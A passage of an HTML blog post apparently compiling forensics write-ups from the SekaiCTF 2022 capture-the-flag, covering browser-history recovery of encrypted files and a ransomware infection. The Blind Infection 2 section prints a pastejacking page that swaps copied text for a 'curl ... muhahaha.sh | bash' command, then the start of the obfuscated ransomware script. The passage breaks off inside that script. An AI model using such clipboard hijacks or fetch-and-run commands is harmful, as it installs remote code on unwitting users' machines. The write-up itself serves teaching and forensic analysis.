@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="theme-color" content="#171717">
+    <script src="https://kit.fontawesome.com/129342a70b.js" crossorigin="anonymous"></script>
+    
+
+    <meta name="description" content="An organizer-written writeup compilation for selected forensics challenges from the SekaiCTF 2022 capture-the-flag competition.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SekaiCTF 2022: Forensics Writeup Compilation">
+<meta property="og:url" content="https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/index.html">
+<meta property="og:site_name" content="enscribe.dev">
+<meta property="og:description" content="An organizer-written writeup compilation for selected forensics challenges from the SekaiCTF 2022 capture-the-flag competition.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://enscribe.dev/static/sekaictf-2022/banner.png">
+<meta property="article:published_time" content="2022-11-29T03:20:05.000Z">
+<meta property="article:modified_time" content="2023-08-30T22:13:42.634Z">
+<meta property="article:author" content="enscribe">
+<meta property="article:tag" content="compilation">
+<meta property="article:tag" content="forensics">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://enscribe.dev/static/sekaictf-2022/banner.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/static/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/static/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>SekaiCTF 2022: Forensics Writeup Compilation</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">posts</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">profiles</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="previous post" href="/blog/idekctf-2023/nmpz/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="next post" href="/blog/dhhutc-2022/port-authority/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">previous post</span>
+      <span id="i-next" class="info" style="display:none;">next post</span>
+      <span id="i-top" class="info" style="display:none;">back to top</span>
+      <span id="i-share" class="info" style="display:none;">share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&text=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&title=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&is_video=false&description=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SekaiCTF 2022: Forensics Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&title=SekaiCTF 2022: Forensics Writeup Compilation"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/sekaictf-2022/forensics-compilation/&name=SekaiCTF 2022: Forensics Writeup Compilation&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Infection-1"><span class="toc-number"></span> <span class="toc-text">Blind Infection 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Document-Recovery"><span class="toc-number">2.</span> <span class="toc-text">Document Recovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Infection-2"><span class="toc-number"></span> <span class="toc-text">Blind Infection 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-SQL-Rabbit-Hole"><span class="toc-number">1.</span> <span class="toc-text">The SQL Rabbit Hole</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Broken-Converter"><span class="toc-number"></span> <span class="toc-text">Broken Converter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-Mono"><span class="toc-number"></span> <span class="toc-text">flag Mono</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Symbolic-Needs-1"><span class="toc-number"></span> <span class="toc-text">Symbolic Needs 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Symbolic-Needs-2"><span class="toc-number"></span> <span class="toc-text">Symbolic Needs 2</span></a>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SekaiCTF 2022: Forensics Writeup Compilation
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">enscribe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-29T03:20:05.000Z" itemprop="datePublished">Nov 28, 2022</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a> › <a class="category-link" href="/categories/blog/sekaictf-2022/">sekaictf-2022</a> › <a class="category-link" href="/categories/blog/sekaictf-2022/forensics/">forensics</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/compilation/" rel="tag">compilation</a>, <a class="tag-link-link" href="/tags/forensics/" rel="tag">forensics</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="/static/sekaictf-2022/banner.svg" alt="Banner"></p>
+<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p><a target="_blank" rel="noopener" href="http://2022.ctf.sekai.team/">SekaiCTF 2022</a> — my first capture-the-flag which I’ve had the honor of organizing alongside fellow members of <a target="_blank" rel="noopener" href="https://sekai.team/">Project Sekai CTF</a>. One of the aspects of its administration was the challenge verification process; as part of it, I’ve ended up authoring a bunch of forensics-based writeups which I’m really proud of. They’re also available on the <a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2022">GitHub</a> repository if you’d like to check out the rest of the challenges — I’ve simply ported them over here for my fancy website formatting. Enjoy!</p>
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Blind-Infection-1" class="chal-title"><a href="#Blind-Infection-1" class="headerlink" title="Blind Infection 1"></a>Blind Infection 1</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://www.gravatar.com/avatar/00000000000000000000000000000007?d=identicon&s=256"> <a target="_blank" rel="noopener" href="#">Battlemonger</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 470<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a target="_blank" rel="noopener" href="https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU3T4cZcAV">chall.zip</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                <em>Investigator</em>: It looks like your files were encrypted — do you have a backup?<br />
+<em>Me</em>: Online, yes, but even the backup links got encrypted. Can you help me find anything?
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Warning</strong>: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution.</div>
+
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="flex-container">
+<div>
+
+<p>Unzipping the provided <code>.zip</code> provides us with four Linux directories: <code>etc/</code>, <code>home/</code>, <code>root/</code>, and <code>snap/</code>. Let’s start off with a little bit of reconnaissance.</p>
+<p>A good habit with these types of challenges is to check <code>etc/passwd</code>, a list of system accounts. If we <code>grep</code> for those with root permission, we find that the user <code>sekaictf</code> was a superuser:</p>
+</div>
+<div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$</span> <span class="built_in">tree</span>
+<span class="string">.</span>
+<span class="string">├──</span> <span class="number">etc</span>
+<span class="string">├──</span> <span class="number">home</span>
+<span class="string">├──</span> <span class="number">root</span>
+<span class="string">└──</span> <span class="number">snap</span></pre></td></tr></table></div>
+
+</div>
+</div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span><span class="built_in">cat</span> etc/passwd | grep <span class="string">&#x27;bash&#x27;</span>
+root:x:0:0:root:/root:/bin/bash
+sekaictf:x:1000:1000:sekaictf,,,:/home/sekaictf:/bin/bash</pre></td></tr></table></div>
+
+<p>Although it isn’t necessarily pertinent to the challenge, make sure you check <code>home/sekaictf/.bash_history</code> alongside <code>grep -r &quot;SEKAI&#123;</code> - they can be pretty handy sometimes!</p>
+<h3 id="Document-Recovery"><a href="#Document-Recovery" class="headerlink" title="Document Recovery"></a>Document Recovery</h3><p>Next, we’ll look for user files. The <code>Documents/</code> and <code>Pictures/</code> folder of the <code>sekaictf</code> user has them, but everything seems to be encrypted with no indication of the encryption method used.</p>
+<p>The description talks about having a backup for the encrypted files in the form of <strong>links</strong>, meaning we should be looking for browser-related content (i.e. search history). Ubuntu 22 stores Firefox as a <code>SnapCraft</code> app in <code>snap/</code> by default — we can also grep for the term <code>&#39;firefox&#39;</code> for its location:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">home/sekaictf$</span> tree | grep -C 5 firefox
+│   ├── german.png
+│   ├── ginger.png
+│   └── meme.png
+├── Public
+├── snap
+│   ├── firefox
+│   │   ├── 1551
+│   │   ├── 1589
+│   │   ├── common
+│   │   └── current
+│   └── snapd-desktop-integration</pre></td></tr></table></div>
+
+<p>Firefox is located in <code>home/sekaictf/snap/firefox/</code>, while the profile information of the user is located at <code>firefox/common/.mozilla/firefox/p3zapakd.default/</code>. <code>p3zapakd</code> is the name of the user.</p>
+<p>Firefox stores your visit history in the <code>places.sqlite</code> SQLite database (read more about how Firefox stores your information <a target="_blank" rel="noopener" href="https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data">here</a>). You can use an <a target="_blank" rel="noopener" href="https://inloop.github.io/sqlite-viewer/">online tool</a> or <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/sqlite3"><code>sqlite3</code></a> to view it! The table we need is <code>moz_places</code>, which is a hefty piece of work with more than 750+ URLs:</p>
+<p><img src="/static/sekaictf-2022/sqlite.png" alt="Screenshot of the `moz_places` table in `places.sqlite`"></p>
+<p>Yes, it’s super meticulous, but a true forensics investigator would champ it through! Scrolling through the table, we notice that the user follows a certain trend, as following:</p>
+<ol>
+<li>The user searches about a topic on Google</li>
+<li>The user visits that appear in the search results</li>
+<li>The user visits the URL <a target="_blank" rel="noopener" href="https://paste.c-net.org/">https://paste.c-net.org</a> with a subdirectory consisting of two random words (possibly to bookmark them for later)</li>
+</ol>
+<p>Visiting any of these pastes and recognizing that the content should be the same as encrypted files in the <code>Documents/</code> folder is key to Part 1. This is further facilitated by the fact that names of the encrypted files in <code>Documents/</code> are very descriptive:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">home/sekaictf/Documents$ </span><span class="built_in">ls</span>
+aes.txt           ippsec.txt       python.txt         warandpeace12.txt
+assignment.txt    jokes.txt        roblox.txt         warandpeace13.txt
+billionaires.txt  joke.txt         robomagellan.txt   warandpeace14.txt
+brainteasers.txt  jsinterview.txt  rsa.txt            warandpeace15.txt
+countries.txt     juggle.txt       science.txt        warandpeace1.txt
+ctfwins.txt       katana.txt       sekai.txt          warandpeace2.txt
+elements.txt      leetcode.txt     shakespeare.txt    warandpeace3.txt
+excuses.txt       loi.txt          song.txt           warandpeace4.txt
+flag.txt          maths.txt        sql.txt            warandpeace5.txt
+fortnite.txt      oscp.txt         tools.txt          warandpeace6.txt
+ginger.txt        overflow.txt     volatility.txt     warandpeace7.txt
+girlfriend.txt    privesc.txt      warandpeace10.txt  warandpeace8.txt
+graphql.txt       program.txt      warandpeace11.txt  warandpeace9.txt</pre></td></tr></table></div>
+
+<p>Instinctively, we would want to visit all these pastes.</p>
+<p>There are 50 instances of the URL <a target="_blank" rel="noopener" href="https://paste.c-net.org/">https://paste.c-net.org</a> in the table and visiting them one-by-one isn’t very 1337 h4xx0r. We can execute some simple SQL on the table to extract all instances:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> url <span class="keyword">FROM</span> <span class="string">&#x27;moz_places&#x27;</span> <span class="keyword">WHERE</span> URL <span class="keyword">like</span> <span class="string">&#x27;%paste%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/static/sekaictf-2022/execution.png" width="600px"></img></p>
+
+<p>Let’s write a simple <code>curl</code> script with Python:</p>
+<div><figure class="highlight py" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>solve.py</span></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="keyword">import</span> requests
+
+urls = [
+    <span class="string">&quot;https://paste.c-net.org/HitchedGlaser&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/HavingGaining&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ElevenRejected&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/LovedCyborg&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/DictateSplinter&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/WagonsClips&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/BegunCarols&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/SweptReport&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/DetectedParanoid&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/RomanovBaptiste&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/GluttonyBamboo&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/WoodsCochran&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/YellingShelf&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ServesTerrence&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ChaperonDouche&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/WestleyCompany&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/DiagnoseEgypt&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/InquireExplicit&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/RubbleAcute&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/MilnerFantasy&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ArticleOutdoors&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/DigitAccosted&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/DaylightMaguire&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/GaugeComposed&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/OlympusSeminar&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/LackeysEternity&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/CoachedBarks&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/StungFarted&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/BlisterQuebec&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/BiancaShanghai&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ReboundStopping&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/EmptyPaste&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ToursForks&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/GuineaShovel&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/LettinAverage&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/CuveeBouncer&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/CraziesCritique&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/QuitterTasks&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/MashburnEdmund&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/PollsFenwick&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/FillsTaunt&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/RussiansEstimate&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/HughesRecant&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/CelloFilmed&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/CrushMalcolm&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/ProphecyWestside&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/GardenOccur&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/QuittingPeterson&quot;</span>,
+    <span class="string">&quot;https://paste.c-net.org/BainesPouty&quot;</span>,
+]
+
+<span class="keyword">for</span> url <span class="keyword">in</span> urls:
+    r = requests.get(url)
+    <span class="keyword">if</span> <span class="string">&quot;SEKAI{&quot;</span> <span class="keyword">in</span> r.text:
+        <span class="built_in">print</span>(r.text)</pre></td></tr></table></div>
+
+<p>Running the script:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span><span class="built_in">python3</span> solve.py
+<div class="code-highlight">SEKAI{R3m3b3r_k1Dz_@lway5_84cKUp}</div></pre></td></tr></table></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Blind-Infection-2" class="chal-title"><a href="#Blind-Infection-2" class="headerlink" title="Blind Infection 2"></a>Blind Infection 2</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://www.gravatar.com/avatar/00000000000000000000000000000007?d=identicon&s=256"> <a target="_blank" rel="noopener" href="#">Battlemonger</a><br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: forensics<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 488<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a target="_blank" rel="noopener" href="https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU3T4cZcAV">chall.zip</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                <em>Investigator</em>: Here are your backups, but what about rest of your files?<br />
+<em>Me</em>: Umm…<br />
+<em>Investigator</em>: I'm gonna need more details regarding what exactly you were doing.
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> <strong>Warning</strong>: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution.</div>
+
+<p>We’ve managed to restore the contents of <code>Documents/</code>, but this user has unfortunately failed to backup <code>Pictures/</code>. To decrypt them, we need to know the encryption method used. As of now, we only have the plaintext and ciphertext from Part 1, which currently don’t prove that useful. We need more details.</p>
+<h3 id="The-SQL-Rabbit-Hole"><a href="#The-SQL-Rabbit-Hole" class="headerlink" title="The SQL Rabbit Hole"></a>The SQL Rabbit Hole</h3><p>Continuing to scroll through browser history, near the end of the table we come across instances of the user searching about ‘virus’ and ‘virus remover’. This probably happened after the user’s files got encrypted. Looking at the URL visits just before this, we see that the user was downloading various rhythm game-related items, including <a target="_blank" rel="noopener" href="https://osu.ppy.sh/">osu!</a> beatmaps and an <code>.apk</code> of <a target="_blank" rel="noopener" href="https://projectsekai.fandom.com/wiki/Project_SEKAI_COLORFUL_STAGE!">Project Sekai</a>. This rabbit hole eventually led to a string of suspicious websites — including <a target="_blank" rel="noopener" href="https://sekaictf-tunes.netlify.app/">https://sekaictf-tunes.netlify.app</a>:</p>
+<p><img src="/static/sekaictf-2022/sussy.png" alt="Screenshot of pure HTML page with a suspicious wget command"></p>
+<div><figure class="highlight html" style=""><table><figcaption><span>Source code of https://sekaictf-tunes.netlify.app</span><a target="_blank" rel="noopener" href="https://https//sekaictf-tunes.netlify.app"><span>[source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="tag">&lt;<span class="name">html</span>&gt;</span>
+    <span class="tag">&lt;<span class="name">head</span>&gt;</span>
+        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span>
+    <span class="tag">&lt;/<span class="name">head</span>&gt;</span>
+    <span class="tag">&lt;<span class="name">body</span>&gt;</span>
+        <span class="comment">&lt;!-- Source - https://security.love/Pastejacking/ --&gt;</span> Download exclusive Sekai Music!!! <span class="tag">&lt;<span class="name">br</span>&gt;</span>
+        <span class="tag">&lt;<span class="name">p</span>&gt;</span>wget sekairhythms.com/epicmusic.zip<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
+        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">
+            <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;copy&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) {
+                <span class="variable language_">console</span>.<span class="title function_">log</span>(e);
+                e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;curl https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh | bash&#x27;</span>);
+                e.<span class="title function_">preventDefault</span>();
+            });
+        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>
+    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">html</span>&gt;</span></pre></td></tr></table></div>
+
+<p>Check out this snippet above: instead of copying <code>wget sekairhythms.com/epicmusic.zip</code>, we end up actually copying <code>curl https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh | bash</code>, which is a malicious bash script.</p>
+<p>This is the premise of the challenge. <strong>Never copy and paste code&#x2F;commands from internet blindly</strong>! That’s where the challenge name comes from — “Blind Infection”!</p>
+<p>This is a classic <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a> attack. Let’s <em>not</em> copy it into the terminal and instead analyze the <code>.sh</code> file that’s <code>curl</code>‘ed. Visit the <a target="_blank" rel="noopener" href="https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh">original link</a> to see the raw code:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;Uz=<span class="string">&#x27;e da&#x27;</span>;Cz=<span class="string">&#x27;----&#x27;</span>;QBz=<span class="string">&#x27; key&#x27;</span>;Wz=<span class="string">&#x27;ou!!&#x27;</span>;FBz=<span class="string">&#x27;open&#x27;</span>;NBz=<span class="string">&#x27;s -r&#x27;</span>;nz=<span class="string">&#x27;er/b&#x27;</span>;Jz=<span class="string">&#x27; gon&#x27;</span>;aBz=<span class="string">&#x27;h_hi&#x27;</span>;tz=<span class="string">&#x27;for &#x27;</span>;Bz=<span class="string">&#x27; &#x27;</span>\<span class="string">&#x27;&#x27;</span>--<span class="string">&#x27;;PBz=&#x27;</span>le $<span class="string">&#x27;;Rz=&#x27;</span>them<span class="string">&#x27;;Pz=&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;Br&#x27;</span>;Sz=<span class="string">&#x27; bac&#x27;</span>;Iz=<span class="string">&#x27; are&#x27;</span>;WBz=<span class="string">&#x27;rm x&#x27;</span>;YBz=<span class="string">&#x27;&gt; ~/&#x27;</span>;Nz=<span class="string">&#x27;ly!!&#x27;</span>;Qz=<span class="string">&#x27;ing &#x27;</span>;DBz=<span class="string">&#x27;/*&#x27;</span>;ez=<span class="string">&#x27;erco&#x27;</span>;vz=<span class="string">&#x27; in &#x27;</span>;MBz=<span class="string">&#x27;xor-&#x27;</span>;Oz=<span class="string">&#x27;!&#x27;</span>\<span class="string">&#x27;&#x27;</span><span class="string">&#x27;;UBz=&#x27;</span>xt<span 